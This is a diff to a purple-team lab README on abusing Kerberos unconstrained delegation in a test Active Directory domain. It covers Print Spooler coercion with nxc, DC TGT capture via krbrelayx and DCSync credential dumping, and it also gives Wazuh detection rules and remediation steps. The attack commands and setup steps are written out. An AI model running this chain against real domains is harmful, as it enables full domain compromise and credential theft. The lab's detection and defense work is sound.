@@ -1,10 +1,14 @@
 # Lab 16 — Kerberos Unconstrained Delegation & PrinterBug Coercion
 
-*Part of the [Kerberos Attacks and Defense Labs](../README.md) — an advanced purple-team investigation: Active Directory Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`), Print Spooler RPC coercion (`PrinterBug` / `DFSCoerce` / `PetitPotam`), intercepting Domain Controller machine TGTs (`WIN-SOCLAB$`) via `krbrelayx.py`, full-domain DRSUAPI credential dumping (`secretsdump`), and Wazuh SIEM detection engineering (Rules 100130 & 100131).*
+*Part of the [Kerberos Attacks and Defense Labs](../README.md) — an advanced purple-team investigation: Active Directory machine account internals (`WIN-SOCLAB$` vs `FAKE-SRV$`), Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`), Print Spooler RPC coercion (`PrinterBug` / `DFSCoerce` / `PetitPotam`), intercepting Domain Controller TGTs via `krbrelayx.py`, full-domain DRSUAPI credential dumping (`secretsdump`), and Wazuh SIEM detection engineering (Rules 100130 & 100131).*
 
 ---
 
-## 🎯 Executive Summary & Attack Chain
+## 💡 Conceptual Foundation: Machine Accounts (`$`) & Unconstrained Delegation
+
+In Active Directory, **every domain-joined server and workstation has its own account** ending with `$` (e.g., `WIN-SOCLAB$`). When a server boots—before any human logs in—it uses its machine account and Kerberos TGT to authenticate on the network and pull Group Policy. Because `WIN-SOCLAB` is the **Domain Controller**, `WIN-SOCLAB$` holds **full DRSUAPI (DCSync) replication privileges** over the entire domain.
+
+With **Unconstrained Delegation** (`TrustedForDelegation = $true`), any user or machine that authenticates to a delegated server has its **entire Kerberos TGT** embedded and cached in that server's `lsass.exe` memory. By coercing `WIN-SOCLAB$` to authenticate to an attacker-controlled delegated host (`FAKE-SRV$` pointing to Kali `192.168.100.50`), the attacker captures the DC's own TGT and dumps the entire domain without needing any admin password.
 
 ```text
 ┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
@@ -12,9 +16,9 @@
 ├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
 │                                                                                                        │
 │  [ Phase 1: Delegation Misconfiguration ]                                                              │
-│  Delegated Host (APP-SRV01$ / FAKE-SRV$) has TrustedForDelegation = $true & cifs/ SPN                  │
+│  Delegated Host (FAKE-SRV$) has TrustedForDelegation = $true & cifs/ SPN                               │
 │       │                                                                                                │
-│       └─► Event ID 4741 / 4742 [Wazuh Rule 100130: Level 12 Alert]                                     │
+│       └─► Event ID 4742 (UAC: %%2093) [Wazuh Rule 100130: Level 12 Alert]                              │
 │                                                                                                        │
 │  [ Phase 2: Coercion via Normal User (alexrivera) ]                                                    │
 │  Kali (192.168.100.50): nxc smb 192.168.100.146 -u alexrivera -M coerce_plus -o LISTENER=...           │
@@ -43,7 +47,7 @@ Get-Service Spooler
 
 ![Screenshot 1](images/Screenshot_1.png)
 
-2. Provision the delegated computer account (`FAKE-SRV$` / `APP-SRV01$`) with `TrustedForDelegation $true`, a decryption password, and a `cifs/` SPN:
+2. Provision the delegated computer account (`FAKE-SRV$`) with `TrustedForDelegation $true`, a decryption password, and a `cifs/` SPN:
 ```powershell
 New-ADComputer -Name "FAKE-SRV" -SamAccountName "FAKE-SRV$" -DNSHostName "FAKE-SRV.soclab.local"
 Set-ADComputer -Identity "FAKE-SRV" -TrustedForDelegation $true
@@ -53,7 +57,7 @@ Set-ADComputer -Identity "FAKE-SRV" -ServicePrincipalNames @{Add="cifs/FAKE-SRV.
 
 ![Screenshot 2](images/Screenshot_2.png)
 
-3. Map the delegated hostname to the Kali listener (`192.168.100.50`) in DNS and `hosts`, then verify port 445 connectivity:
+3. Map `FAKE-SRV.soclab.local` to the Kali listener (`192.168.100.50`) in DNS and `hosts`, then verify port 445 connectivity:
 ```powershell
 Add-DnsServerResourceRecordA -Name "FAKE-SRV" -ZoneName "soclab.local" -IPv4Address "192.168.100.50"
 ```
@@ -72,7 +76,7 @@ Test-NetConnection -ComputerName FAKE-SRV.soclab.local -Port 445
 
 ## ⚡ Phase 2: Coercion & DC TGT Capture (`Kali Linux`)
 
-1. Clone `krbrelayx`, derive the MD4 NTLM hash for the delegated machine account, and start the `krbrelayx.py` listener:
+1. Clone `krbrelayx`, derive the MD4 NTLM hash for `FAKE-SRV$`, and start the `krbrelayx.py` listener:
 ```bash
 git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx
 sudo python3 /opt/krbrelayx/krbrelayx.py -hashes :<REDACTED_MACHINE_NT_HASH>
@@ -115,9 +119,9 @@ impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.1
 
 ---
 
-## 🛡️ Phase 4: Blue Team Telemetry & Custom Wazuh Rules
+## 🛡️ Phase 4: Blue Team Telemetry & Custom Wazuh Rules (`100130` & `100131`)
 
-### Observed SIEM Alerts During Execution
+### 1. Observed Coercion & DCSync Telemetry
 
 - **Rule 100115 (Event 4624):** Off-hours network logon during `nxc` coercion:
 
@@ -153,14 +157,14 @@ impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.1
 
 ---
 
-### Custom Wazuh Rules Deployed (`100130` & `100131`)
+### 2. Custom Wazuh Rules Deployed (`100130` & `100131`)
 
 ```xml
 <!-- Rule 100130: Computer Account Modified with Unconstrained Delegation (Event 4742) -->
 <rule id="100130" level="12">
-  <if_group>windows</if_group>
+  <if_sid>60121</if_sid>
   <field name="win.system.eventID">^4742$</field>
-  <field name="win.eventdata.userAccountControl">2080</field>
+  <field name="win.eventdata.userAccountControl" type="pcre2">2093</field>
   <description>CRITICAL: Computer Account Configured with Unconstrained Delegation (T1558)</description>
   <mitre>
     <id>T1558</id>
@@ -173,7 +177,7 @@ impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.1
   <if_group>windows</if_group>
   <field name="win.system.eventID">^4624$</field>
   <field name="win.eventdata.targetUserName">^WIN-SOCLAB\$$</field>
-  <field name="win.eventdata.ipAddress" negate="yes">^(192\.168\.100\.146|127\.0\.0\.1|::1|-)$</field>
+  <field name="win.eventdata.ipAddress" type="pcre2" negate="yes">^(192\.168\.100\.146|127\.0\.0\.1|::1|-)$</field>
   <description>CRITICAL: Domain Controller Machine Account (WIN-SOCLAB$) Logged On from External/Non-DC IP (Possible Delegation Abuse)</description>
   <mitre>
     <id>T1558</id>
@@ -182,6 +186,42 @@ impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.1
 </rule>
 ```
 
+#### Live Verification: Rule 100131 (`WIN-SOCLAB$` Non-DC IP Logon)
+
+![Screenshot 25](images/Screenshot_25.png)
+
+![Screenshot 26](images/Screenshot_26.png)
+
+![Screenshot 27](images/Screenshot_27.png)
+
+![Screenshot 28](images/Screenshot_28.png)
+
+#### Live Verification: Event 4742 & Rule 100130 (`%%2093` — Trusted For Delegation Enabled)
+
+![Screenshot 23](images/Screenshot_23.png)
+
+![Screenshot 24](images/Screenshot_24.png)
+
+![Screenshot 29](images/Screenshot_29.png)
+
+![Screenshot 30](images/Screenshot_30.png)
+
+![Screenshot 31](images/Screenshot_31.png)
+
+![Screenshot 32](images/Screenshot_32.png)
+
+![Screenshot 33](images/Screenshot_33.png)
+
+![Screenshot 34](images/Screenshot_34.png)
+
+![Screenshot 35](images/Screenshot_35.png)
+
+![Screenshot 36](images/Screenshot_36.png)
+
+![Screenshot 37](images/Screenshot_37.png)
+
+![Screenshot 38](images/Screenshot_38.png)
+
 ---
 
 ## 🔒 Defensive Remediation
@@ -189,3 +229,4 @@ impacket-smbclient -hashes :<REDACTED_NTLM_HASH> SOCLAB/alexrivera@192.168.100.1
 1. **Disable Unconstrained Delegation:** Never enable `TrustedForDelegation` on member servers; migrate to Constrained Delegation or RBCD.
 2. **Disable Print Spooler on Domain Controllers:** `Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled`.
 3. **Add Sensitive Accounts to `Protected Users`:** Prevents TGT delegation and NTLM caching.
+4. **Full Forest Recovery (If Compromised):** Reset `krbtgt` **twice** (10–24 hours apart), rotate all user/service/machine passwords, and purge unauthorized ACLs.
